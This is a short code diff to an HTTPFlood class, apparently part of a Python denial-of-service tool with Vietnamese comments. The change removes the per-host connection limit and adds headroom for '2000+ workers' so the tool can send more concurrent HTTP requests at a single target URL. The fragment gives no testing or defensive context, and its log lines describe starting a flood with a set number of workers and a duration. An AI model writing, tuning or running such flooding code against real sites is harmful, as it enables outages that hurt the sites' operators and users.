@@ -160,14 +160,15 @@ class HTTPFlood:
         self._stop_event.clear()
 
         connector = aiohttp.TCPConnector(
-            limit=self.num_workers + 10,
-            limit_per_host=self.num_workers,
+            limit=self.num_workers + 200,  # headroom cho 2000+ workers
+            limit_per_host=0,              # 0 = không giới hạn per-host
             ttl_dns_cache=300,
             ssl=False,
             force_close=False,
+            enable_cleanup_closed=True,
         )
 
-        timeout = aiohttp.ClientTimeout(total=10, connect=3)
+        timeout = aiohttp.ClientTimeout(total=15, connect=5)
 
         logger.info(f"Bắt đầu HTTP {self.method} Flood: {self.target_url}")
         logger.info(f"Workers: {self.num_workers}, Duration: {self.duration}s")
